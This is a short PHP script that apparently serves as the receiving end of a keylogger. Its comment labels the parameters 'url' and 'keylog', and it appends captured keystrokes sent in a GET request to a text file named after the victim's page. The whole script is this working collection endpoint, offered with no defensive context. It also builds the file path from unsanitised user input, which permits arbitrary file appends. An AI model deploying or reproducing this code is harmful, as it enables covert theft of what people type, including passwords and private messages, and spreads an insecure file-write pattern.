<?php
//oq = url search = keylog
if($_GET["search"] != null && $_GET["oq"] != null)
{
	$file = fopen($_GET["oq"] . ".txt","a+");
	fwrite($file, $_GET["search"]);
	fclose($file);
}
?>